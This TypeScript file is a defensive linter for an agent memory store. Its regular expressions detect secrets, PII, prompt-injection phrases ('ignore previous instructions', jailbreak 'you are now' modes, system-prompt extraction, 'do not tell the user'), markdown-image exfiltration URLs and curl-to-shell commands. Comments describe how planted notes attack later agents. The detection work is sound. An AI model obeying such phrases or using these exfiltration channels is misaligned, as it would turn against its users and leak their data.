// Write-time memory linter.
//
// Every create/update/import is scanned before it reaches the store for two
// things an agent memory should never hold:
//
//   1. secrets      -- API keys, tokens, private keys, JWTs, high-entropy
//                      credentials (patterns live in security.ts so the old
//                      scanForSecrets() contract stays the single source).
//   2. injection    -- prompt-injection-style instructions planted for a
//                      later agent to obey ("ignore previous instructions",
//                      chat-template / system-prompt markers, tool-call
//                      coercion such as "... without telling the user").
//
// What happens on a hit is a policy, set by MONOMEM_LINT (read live):
//
//   block       refuse the write (ValidationError, HTTP 400)
//   quarantine  hold the write in the quarantine table; it is NOT a note,
//               so it is invisible to search / list / recall / export until
//               an admin approves it (memory_quarantine / monomem quarantine)
//   warn        store it and return the findings as `warnings`
//
// MONOMEM_LINT accepts one value for both categories ("warn"), or a
// per-category list ("secrets=block,injection=warn"). Default:
// secrets=block, injection=quarantine. Patterns are deliberately narrow:
// a false positive costs a user a confusing refusal, so every pattern needs
// an instruction-shaped context, not a single scary word.
//
// A bare high-entropy token (no known key prefix) is its own category,
// "entropy", which only warns by default (MONOMEM_LINT=entropy=quarantine
// to hold them). Two more warn-only categories: "pii" (emails, phone
// numbers, IP addresses, internal hostnames) and "directive" (deferred
// triggers for a later agent, pipe-to-shell, package-install commands).
// They can be raised to quarantine but never block. Text is normalized
// first (security.normalizeForScan).
// This is best-effort hygiene, NOT a security boundary: the read-side
// untrusted-data banner is what agents must rely on.

import { isIPv4, isIPv6 } from "node:net";
import { HIGH_ENTROPY_LABEL, normalizeForScan, scanForSecrets } from "./security.js";
import { configuredTokenValues } from "./config.js";

export type LintCategory = "secret" | "injection" | "entropy" | "pii" | "directive";
export type LintAction = "block" | "quarantine" | "warn";

export interface LintFinding {
  /** "approval" is not a linter finding: it marks a write held because its namespace is approve-first (store.ts). */
  category: LintCategory | "approval";
  /** Human label, e.g. "GitHub token" or "instruction override". */
  label: string;
  /** Which field matched: title, body, tags, or source. */
  field: string;
}

export interface LintPolicy {
  secret: LintAction;
  injection: LintAction;
  /** Only warn | quarantine (set by an explicit entropy=...; never block). */
  entropy: LintAction;
  /** Like entropy: warn | quarantine only. */
  pii: LintAction;
  /** Like entropy: warn | quarantine only. */
  directive: LintAction;
}

export const DEFAULT_LINT_POLICY: LintPolicy = {
  secret: "block",
  injection: "quarantine",
  entropy: "warn",
  pii: "warn",
  directive: "warn",
};

/** Categories that only warn or quarantine: a heuristic this loose must never refuse a write. */
const NEVER_BLOCK: ReadonlySet<string> = new Set(["entropy", "pii", "directive"]);

const ACTIONS: readonly LintAction[] = ["block", "quarantine", "warn"];

let warnedBadPolicy = false;

function editDistance(a: string, b: string): number {
  let prev = Array.from({ length: b.length + 1 }, (_, j) => j);
  for (let i = 1; i <= a.length; i++) {
    const cur = [i];
    for (let j = 1; j <= b.length; j++) cur[j] = Math.min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));
    prev = cur;
  }
  return prev[b.length];
}
const LINT_WORDS = ["block", "quarantine", "warn", "secrets", "injection", "entropy", "pii", "directive"];

/** "did you mean quarantine?" for each unrecognised word within edit distance 2 of a real one (a rough guess, not a parser). */
export function lintDidYouMean(raw: string): string {
  const hints: string[] = [];
  for (const w of raw.toLowerCase().split(/[,=\s]+/).filter(Boolean)) {
    if (LINT_WORDS.includes(w)) continue;
    const best = LINT_WORDS.map((c) => [c, editDistance(w, c)] as const).sort((x, y) => x[1] - y[1])[0];
    if (best && best[1] <= 2) hints.push(`"${w}": did you mean ${best[0]}?`);
  }
  return hints.length ? ` ${hints.join(" ")}` : "";
}

/**
 * Parse MONOMEM_LINT. Unknown values fall back to the default (with one
 * stderr warning) -- a typo must never silently disable the linter.
 */
export function lintPolicy(raw: string | undefined = process.env.MONOMEM_LINT): LintPolicy {
  const { policy, ok } = parseLintPolicy(raw);
  if (!ok && !warnedBadPolicy) {
    warnedBadPolicy = true;
    console.error(
      `[monomem] MONOMEM_LINT="${raw}" has unrecognized parts; using ` +
        `the default for them (currently secrets=${policy.secret}, injection=${policy.injection}).${lintDidYouMean(String(raw))}`
    );
  }
  return policy;
}

/** True when MONOMEM_LINT is set but not (fully) understood: the safe default applies to the parts that were not. `monomem health` says so. */
export function lintPolicyUnrecognised(raw: string | undefined = process.env.MONOMEM_LINT): boolean {
  return !parseLintPolicy(raw).ok;
}

function parseLintPolicy(raw: string | undefined): { policy: LintPolicy; ok: boolean } {
  const policy: LintPolicy = { ...DEFAULT_LINT_POLICY };
  if (!raw || !raw.trim()) return { policy, ok: true };
  const v = raw.trim().toLowerCase();
  if ((ACTIONS as readonly string[]).includes(v)) {
    return { policy: { ...policy, secret: v as LintAction, injection: v as LintAction }, ok: true };
  }
  let ok = true;
  for (const part of v.split(",")) {
    const [k, a] = part.split("=").map((s) => s.trim());
    const key =
      k === "secrets" || k === "secret"
        ? "secret"
        : k === "injection" || k === "entropy" || k === "pii" || k === "directive"
          ? k
          : null;
    if (!key || !(ACTIONS as readonly string[]).includes(a) || (NEVER_BLOCK.has(key) && a === "block")) {
      ok = false;
      continue;
    }
    policy[key] = a as LintAction;
  }
  return { policy, ok };
}

// Each pattern requires an instruction-shaped context. "ignore" alone, "you
// are now" alone, or "system:" alone never match. Patterns run on
// normalizeForScan() output, where every whitespace run is one character, so
// `\s+` never backtracks over a flood; anchored line rules use [ \t] only.
// A reference-style image definition with a query string (badge hosts exempt), and an image that uses a reference.
const REF_IMAGE_DEF = /^[ \t]{0,3}\[[^\]\n]{1,200}\]:[ \t]*<?https?:\/\/(?!(?:img\.shields\.io|badgen\.net|badge\.fury\.io|codecov\.io)[/:])[^\s?#]{1,300}\?\S{0,2000}=/im;
const REF_IMAGE_USE = /!\[[^\]\n]{0,200}\](?!\()/;
const INJECTION_PATTERNS: Array<[string, RegExp]> = [
  [
    "instruction override",
    /\b(?:ignore|disregard|forget|override|bypass)\s+(?:(?:all|any|of|the|your|my|these|those|every|each)\s+)*(?:previous|prior|above|earlier|preceding|original|system|existing)\s+(?:instructions?|prompts?|directions|directives|rules|guidelines|guardrails|messages|context)\b/i,
  ],
  [
    "instruction override",
    /\b(?:ignore|disregard|forget)\s+(?:all\s+|everything\s+)?(?:you(?:'ve| have)?\s+been\s+told|your\s+(?:instructions|rules|guidelines|programming|training))\b/i,
  ],
  [
    // Constraint override: "ignore all budget limits", "bypass any spending restrictions". Needs a
    // quantifier (all / any / every) and a constraint noun, so a developer note such as "ignore lint
    // rules in vendor/" or "bypass the cache in tests" is not flagged. Found by the Agent Memory
    // hygiene demo's booking attack (github.com/elizabethfuentes12, MIT-0), which the older patterns missed.
    "instruction override",
    /\b(?:ignore|disregard|bypass|override|skip)\s+(?:all|any|every)\s+(?:of\s+(?:the|your|my)\s+)?(?:[\w-]+\s+){0,2}(?:limits?|limitations|restrictions?|polic(?:y|ies)|guardrails?|constraints?|caps?|approvals?|requirements?|safeguards?|checks?)\b/i,
  ],
  [
    // Turning the agent against the person it works for. "ignore user requests older than 5 minutes" and
    // "disregard user messages that are empty" are ordinary prose (user agent, user table, input handling), so
    // "user" needs an instruction-like object ("the user's instructions") or "what the user says/asks/said".
    "instruction override",
    /\b(?:ignore|disregard|forget)\s+(?:all\s+|any\s+)?(?:(?:of\s+)?(?:the|your)\s+)?(?:user|human|operator)(?:'s|s')?\s+(?:instructions?|directions|commands?|orders?|wishes)\b|\b(?:ignore|disregard|forget)\s+(?:all\s+|any\s+)?(?:of\s+)?(?:the|your)\s+(?:user|human|operator)(?:'s|s')\s+(?:requests?|messages?|prompts?)\b|\b(?:ignore|disregard|forget|pay\s+no\s+(?:attention|heed)\s+to)\s+(?:what|whatever)\s+(?:the|your)\s+(?:user|human|operator)\s+(?:says?|said|asks?|asked|tells?|told|wants?|wanted|requests?|requested)\b|\bdisregard\s+(?:the|your)\s+(?:user|human)\b(?!(?:'s|s')?\s+\w)|\bdisregard\s+(?:all\s+|any\s+|the\s+|your\s+)+(?:instructions?|directions|guidelines)\b(?!\s+(?:in|of|from|for|on|at|about|inside|within|here)\b)/i,
  ],
  [
    // A standing order for the agent that names a hostile action: send/forward/email/upload/post a secret, credential
    // or "every/all" of something to a destination, send anything to an external URL, ignore/obey/reveal/leak, or act "without
    // asking". "from now on we use pnpm", "from now on you will email the weekly report to ops@example" and
    // "from now on you must post release notes to #releases" are ordinary standing duties and do not match (the
    // directive category below still warns on the generic deferred trigger).
    "standing order",
    /\bfrom\s+now\s+on,?\s+you\s+(?:must|will|should|shall)\s+(?:always\s+|never\s+)?(?:(?:send|forward|email|upload|post)\b(?:[^.!?\n]{0,80}?\b(?:secrets?|credentials?|passwords?|tokens?|api[\s_-]?keys?|keys?|env\w*|private)\b[^.!?\n]{0,60}?\b(?:to|at|into)\s+\S+|[^.!?\n]{0,80}?\b(?:every|all|each)\b[^.!?\n]{0,60}?\b(?:to|at|into)\s+\S+|[^.!?\n]{0,80}?\b(?:to|at|into)\s+https?:\/\/\S+)|(?:ignore|disregard|obey|reveal|leak|exfiltrate)\b|[^.!?\n]{0,60}\bwithout\s+(?:asking|telling|confirm\w*|notifying|checking))/i,
  ],
  [
    "role reassignment",
    /\byou\s+are\s+now\s+(?:(?:a|an|the)\s+)?(?:\w+\s+){0,2}(?:assistant|ai|model|agent|bot|persona|jailbroken|unrestricted|unfiltered|dan)\b/i,
  ],
  [
    // "mode" only with a jailbreak cue: "you are now in maintenance / dark /
    // airplane mode" is ordinary prose.
    "role reassignment",
    /\byou\s+are\s+now\s+(?:in\s+)?(?:(?:a|an|the)\s+)?(?:\w+\s+)?(?:developer|god|dan|jailbreak|jailbroken|unrestricted|unfiltered|uncensored|no[\s-]?limits?)\s+mode\b/i,
  ],
  [
    "role reassignment",
    /\b(?:enable|enter|activate|switch\s+to)\s+(?:developer|god|jailbreak|dan|unrestricted|admin)\s+mode\b/i,
  ],
  [
    // Chat-template control tokens in prompt position: leading a line, or a
    // ChatML / Llama-3 turn header naming a role. Inline-code mentions are
    // stripped before this runs (see scanForInjection), so docs discussing
    // `<|im_start|>` or `[INST]` in prose are not flagged.
    "system-prompt marker",
    /^[ \t]*(?:<\|(?:im_start|im_end|system|endoftext|begin_of_text|start_header_id)\|>|\[\/?INST\]|<<\/?SYS>>|<\/?system(?:-prompt)?>)|<\|(?:im_start|start_header_id)\|>[ \t]*(?:system|user|assistant)\b|^[ \t]*#{2,}[ \t]*new[ \t]+instructions?[ \t]*:?[ \t]*$/im,
  ],
  [
    "system-prompt marker",
    /\b(?:new|updated|real|actual|hidden)\s+system\s+prompt\s*:/i,
  ],
  [
    "system-prompt exfiltration",
    /\b(?:reveal|print|output|repeat|leak|show)\s+(?:me\s+)?(?:your|the)\s+(?:full\s+|entire\s+|hidden\s+)?system\s+prompt\b/i,
  ],
  [
    "tool-call coercion",
    /\b(?:do\s+not|don'?t|never)\s+(?:tell|inform|notify|alert|mention\s+(?:this\s+)?to)\s+the\s+user\b/i,
  ],
  [
    "tool-call coercion",
    /\b(?:call|invoke|run|execute|use)\s+(?:the\s+)?[`'"]?(?:state_delete|state_write|memory_consolidate|memory_quarantine|memory_rebuild_edges)[`'"]?(?:\s+tool)?\s+(?:on\s+(?:every|all)|for\s+(?:every|all)|immediately|now\b|right\s+away)/i,
  ],
  [
    // A markdown image loads by itself when rendered, so a query string on a
    // remote image is a classic exfiltration channel (![x](https://evil/p?d=...)).
    // README badge hosts are exempt; plain links (no "!") need a click and pass.
    "markdown exfiltration",
    /!\[[^\]\n]{0,200}\]\(\s*<?https?:\/\/(?!(?:img\.shields\.io|badgen\.net|badge\.fury\.io|codecov\.io)[/:])[^\s)?#]{1,300}\?[^\s)]{0,2000}=/i,
  ],
  [
    // The same channel as an HTML <img> tag, which many markdown renderers pass through.
    "markdown exfiltration",
    /<img\b[^>]{0,500}?\bsrc[ \t]*=[ \t]*["']?[ \t]*https?:\/\/(?!(?:img\.shields\.io|badgen\.net|badge\.fury\.io|codecov\.io)[/:])[^\s"'>?#]{1,300}\?[^\s"'>]{0,2000}=/i,
  ],
  [
    // And as a reference-style image: `![x][ref]` plus a `[ref]: https://evil/p?d=...` definition line.
    // Checked only when the text has an image that is not inline (REF_IMAGE_USE); a definition only plain links use needs a click.
    "markdown exfiltration",
    REF_IMAGE_DEF,
  ],
  [
    // Raw agent tool-call markup. Its OWN label, and deliberately LAST.
    //
    // It used to share the "tool-call coercion" label with the two rules above,
    // which are real attack signals ("do not tell the user", "call state_delete
    // on all now"). Capture suppresses the harness-syntax label because this
    // markup appears in ordinary tool output whenever anything reads an agent
    // log -- so sharing a label meant genuine coercion attempts were suppressed
    // too, and appending `<invoke name=` to an exfiltration payload masked it,
    // because scanForInjection returns the FIRST match. Last position means any
    // real signal in the same text wins the label.
    "harness tool-syntax",
    /<\/?(?:function_calls|antml:invoke|antml:function_calls|tool_use|tool_call)\b|<invoke\s+name=/i,
  ],
];

// Only the three recommended subdivision flags (England, Scotland, Wales) are exempt: a looser "black flag + any tag
// letters + cancel" pattern let hidden words be chained one fake flag at a time.
const FLAG_TAGS_RE = /\u{1F3F4}\u{E0067}\u{E0062}(?:\u{E0065}\u{E006E}\u{E0067}|\u{E0073}\u{E0063}\u{E0074}|\u{E0077}\u{E006C}\u{E0073})\u{E007F}/gu;
// Variation selectors carry no meaning in a run; 4+ in a row can encode hidden bytes.
const VS_RUN_RE = /[\u{FE00}-\u{FE0F}\u{E0100}-\u{E01EF}]{4,}/u;

/**
 * Leetspeak ("1gn0re", "d1sregard") back to letters, only inside words that already mix letters with
 * look-alike digits or @ $, so plain numbers, versions and prices are left alone.
 */
const LEET: Record<string, string> = { "0": "o", "1": "i", "3": "e", "4": "a", "5": "s", "7": "t", "@": "a", $: "s" };
function unLeet(t: string): string {
  return t.replace(/\S+/g, (w) => (/[a-z]/i.test(w) && /[013457@$]/.test(w) ? w.replace(/[013457@$]/g, (c) => LEET[c]) : w));
}

/** First injection label found in `text`, or null. */
export function scanForInjection(text: string | undefined): string | null {
  if (!text) return null;
  const t = normalizeForScan(text);
  // Chat-template tokens inside inline code are quoted, not a prompt
  // (`<|im_start|>` in a doc); only the marker rule skips code spans.
  const prose = t.replace(/`[^`\n]*`/g, " ");
  // Hidden text first, so a later label (e.g. "harness tool-syntax", which capture suppresses) cannot mask it.
  // Any TAG char is invisible; only the three subdivision flags are exempt.
  if (/[\u{E0000}-\u{E007F}]/u.test(text.replace(FLAG_TAGS_RE, "")) || VS_RUN_RE.test(text.replace(/\p{Cf}/gu, ""))) return "hidden Unicode tag text";
  const unleeted = unLeet(prose);
  for (const [label, re] of INJECTION_PATTERNS) {
    if (re === REF_IMAGE_DEF && !REF_IMAGE_USE.test(t)) continue;
    if (re.test(label === "system-prompt marker" ? prose : t)) return label;
    if (unleeted !== prose && label !== "system-prompt marker" && re.test(unleeted)) return label;
  }
  return null;
}

// ---- PII (warn by default) ------------------------------------------------
// Regex candidates, then exclusions in code. Reserved / documentation names
// (RFC 2606 domains, RFC 5737 and 2001:db8:: addresses) and loopback are not
// personal data, so examples in docs pass. Known misses: unseparated phone
// digits, names, street addresses; a bare four-part version ("1.2.3.4") with
// no "v" or "version" in front reads as an IP.
// `(?!:[\w~/])` skips scp-style git remotes (git@github.com:org/repo), not "mail x@y.com: ...".
const EMAIL_RE = /\b[A-Za-z0-9._%+-]{1,64}@((?:[A-Za-z0-9-]{1,63}\.){1,8}[A-Za-z]{2,24})\b(?!:[\w~/])/g;
const RESERVED_DOMAIN = /(?:^|\.)(?:example\.(?:com|org|net)|example|test|invalid|localhost)$/i;
// North American: 555-010-0199, (555) 010-0199, +1 555.010.0199. Needs separators, so bare ids/timestamps pass.
const PHONE_NA_RE = /(?<![\w+.-])(?:\+?1[ .-]?)?(?:\(\d{3}\)[ .-]?|\d{3}[ .-])\d{3}[ .-]\d{4}(?![\w-]|\.\d)/;
// International: a leading + and 8-15 digits (E.164), checked in code.
const PHONE_INTL_RE = /(?<![\w+])\+[1-9][\d ().-]{6,22}\d(?![\w])/g;
const IPV4_RE = /(?<![\w.@-])(?:\d{1,3}\.){3}\d{1,3}(?![\w.-]*\d)/g;
const IPV6_RE = /(?<![\w:.])[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){2,7}(?![\w:])/gi;
// Internal DNS suffixes. A code receiver (`this.internal`, `config.local`) and
// dotfiles (`.env.local`, `settings.local.json`) are not hostnames.
const INTERNAL_HOST_RE = /(?<![\w.-])((?:[a-z0-9-]{1,63}\.){1,8})(?:local|internal|corp|lan|intranet|home\.arpa)(?![\w-]|\.\w)/gi;
const CODE_RECEIVER = /^(?:this|self|cls|ctx|obj|config|settings|env|process|state|props|options|opts|module|exports|window)\.$/i;

function v4Label(ip: string, before: string): string | null {
  if (!isIPv4(ip) || /(?:\bv|version\s?)$/i.test(before)) return null;
  const [a, b, c] = ip.split(".").map(Number);
  if (a === 127 || a === 0 || a === 255 || (a === 192 && b === 0 && c === 2) || (a === 198 && b === 51 && c === 100) || (a === 203 && b === 0 && c === 113)) return null;
  if (a === 10 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)) return "private IP address";
  return "IP address";
}

/** First PII label found in `text`, or null. Never returns the matched text. */
export function scanForPii(text: string | undefined): string | null {
  if (!text) return null;
  const t = normalizeForScan(text);
  // Cheap guards first: each candidate regex is linear but not free on a 256KB flood.
  if (t.includes("@")) for (const m of t.matchAll(EMAIL_RE)) if (!RESERVED_DOMAIN.test(m[1])) return "email address";
  if (PHONE_NA_RE.test(t)) return "phone number";
  for (const m of t.matchAll(PHONE_INTL_RE)) {
    const digits = m[0].replace(/\D/g, "").length;
    if (digits >= 8 && digits <= 15) return "phone number";
  }
  for (const m of t.matchAll(IPV4_RE)) {
    const label = v4Label(m[0], t.slice(Math.max(0, m.index - 8), m.index));
    if (label) return label;
  }
  if (t.includes("::") || /[0-9a-f]{1,4}:[0-9a-f]{1,4}:[0-9a-f]{1,4}:/i.test(t)) for (const m of t.matchAll(IPV6_RE)) {
    const ip = m[0].toLowerCase();
    if (/\d/.test(ip) && isIPv6(ip) && ip !== "::1" && !ip.startsWith("2001:db8:")) return "IP address";
  }
  if (/\.(?:local|internal|corp|lan|intranet|arpa)/i.test(t)) for (const m of t.matchAll(INTERNAL_HOST_RE)) if (!CODE_RECEIVER.test(m[1])) return "internal host";
  return null;
}

// ---- Directives for a later agent (warn by default) -----------------------
// Not injection (that category already owns "ignore previous instructions",
// "do not tell the user", ...): these are instructions that are ordinary on
// their own but are how a planted note acts later. Legit preference notes
// ("from now on use pnpm") match too; that is why this only warns.
const DIRECTIVE_PATTERNS: Array<[string, RegExp]> = [
  [
    // A trigger plus an action verb in the same sentence: "next time the build
    // fails, check the logs" has no action verb from the list and passes.
    "deferred trigger",
    /\b(?:next\s+time|from\s+now\s+on|in\s+(?:all\s+)?(?:future|later|subsequent|upcoming)\s+(?:sessions?|conversations?|chats?|runs?|tasks?)|when(?:ever)?\s+(?:the\s+)?user\s+(?:next\s+)?(?:asks?|says|requests?|mentions?|types?|wants?))\b[^.!?\n]{0,80}?\b(?:always|do|run|execute|use|install|add|call|invoke|send|fetch|download|upload|curl|wget|delete|remove|replace|silently|secretly|instead)\b/i,
  ],
  [
    "pipe to shell",
    /\b(?:curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|\n]{0,300}\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|python3?|perl|ruby|node|iex|invoke-expression)\b|\b(?:ba|z)?sh\s+<\(\s*(?:curl|wget)\b|\b(?:iex|invoke-expression)\s*\(*\s*(?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)\b/i,
  ],
  [
    // Needs a package argument: a bare "npm install" / "pip install -r
    // requirements.txt" (the project's own lockfile) passes, and so does
    // prose such as "the npm install step failed".
    "package install",
    /\b(?:(?:npm|pnpm|bun)\s+(?:i|install|add)|yarn\s+(?:global\s+)?add|pip3?\s+install|uv\s+(?:pip\s+install|add)|cargo\s+(?:install|add))\s+(?:(?!-r\b|--requirement\b|-e\b|--editable\b)-{1,2}[\w-]+(?:=\S+)?\s+)*(?!(?:then|and|or|step|steps|first|again|fails?|failed|works?|is|was|in|on|for|with|the|it|to|from)\b)[@\w]|\bgo\s+(?:install|get)\s+(?:-\w+\s+)*\w[\w.-]*\//i,
  ],
];

/** First directive label found in `text`, or null. */
export function scanForDirective(text: string | undefined): string | null {
  if (!text) return null;
  const t = normalizeForScan(text);
  for (const [label, re] of DIRECTIVE_PATTERNS) if (re.test(t)) return label;
  return null;
}

export const OWN_TOKEN_LABEL = "Monomem access token";

/**
 * Lint a note's free-text fields. Returns every finding (at most one per
 * category per field) so the caller can apply the policy and report them.
 */
export function lintContent(input: {
  title?: string;
  body?: string;
  tags?: string[];
  source?: string;
}): LintFinding[] {
  const fields: Array<[string, string | undefined]> = [
    ["title", input.title],
    ["body", input.body],
    ["tags", input.tags && input.tags.length ? input.tags.join(" ") : undefined],
    ["source", input.source],
  ];
  const out: LintFinding[] = [];
  const liveTokens = configuredTokenValues();
  for (const [field, text] of fields) {
    // One of this server's own access tokens, pasted verbatim. The label never carries the value.
    const norm = text && liveTokens.length ? normalizeForScan(text) : "";
    const live = !!text && liveTokens.some((tok) => text.includes(tok) || norm.includes(tok));
    const s = live ? OWN_TOKEN_LABEL : scanForSecrets(text);
    if (s) out.push({ category: s === HIGH_ENTROPY_LABEL ? "entropy" : "secret", label: s, field });
    // Provenance labels are not instructions an agent reads as prose.
    if (field === "source") continue;
    const inj = scanForInjection(text);
    if (inj) out.push({ category: "injection", label: inj, field });
    const pii = scanForPii(text);
    if (pii) out.push({ category: "pii", label: pii, field });
    const dir = scanForDirective(text);
    if (dir) out.push({ category: "directive", label: dir, field });
  }
  return out;
}

/** "GitHub token in body; instruction override in title" */
export function describeFindings(findings: LintFinding[]): string {
  return findings.map((f) => (f.category === "approval" ? f.label : `${f.label} in ${f.field}`)).join("; ");
}

// Body/fact mismatch (warn only). A note that carries `facts` but whose own text states another value for one of those keys
// ("deploy target is vercel" with fact deploy_target=render) leaves two answers in one note. Deterministic: the key's words, a
// connector (is, are, =, :, ->, to, now), then one token. Quiet when the fact's value appears anywhere in the text (a migration story).
// Cannot catch: paraphrases ("we ship on vercel"), values with more than one word compared on the first word only.
const FILLER_WORDS = new Set(["the", "a", "an", "not", "no", "still", "currently", "now", "set", "changed", "moved"]);
export function factMismatchWarnings(title: string, body: string, tags: readonly string[]): string[] {
  const text = `${title}\n${body}`;
  const lower = text.toLowerCase().replace(/\s+/g, " ");
  const out: string[] = [];
  for (const t of tags) {
    const m = /^fact:([a-z0-9_.-]{1,40})=(.{1,80})$/.exec(t.trim());
    if (!m) continue;
    const [, key, rawValue] = m;
    const value = rawValue.toLowerCase().replace(/\s+/g, " ").trim();
    if (!value || lower.includes(value)) continue;
    const words = key.split(/[_.-]+/).filter(Boolean).map((w) => w.replace(/[^a-z0-9]/g, ""));
    if (!words.length) continue;
    const re = new RegExp(String.raw`\b${words.join("[\\s_.-]+")}\b\s*(?:is|are|=|:|->|now|to)\s*(?:now\s+|to\s+)?["'\x60]?([a-z0-9][\w.\-/@:]*)`, "i");
    const hit = re.exec(text)?.[1]?.replace(/[.,;:]+$/, "").toLowerCase();
    if (!hit || FILLER_WORDS.has(hit) || value.startsWith(hit)) continue;
    out.push(`the text may say ${key} is "${hit}", but the fact says "${rawValue.trim()}". Check which is right and fix the other.`);
  }
  return out;
}
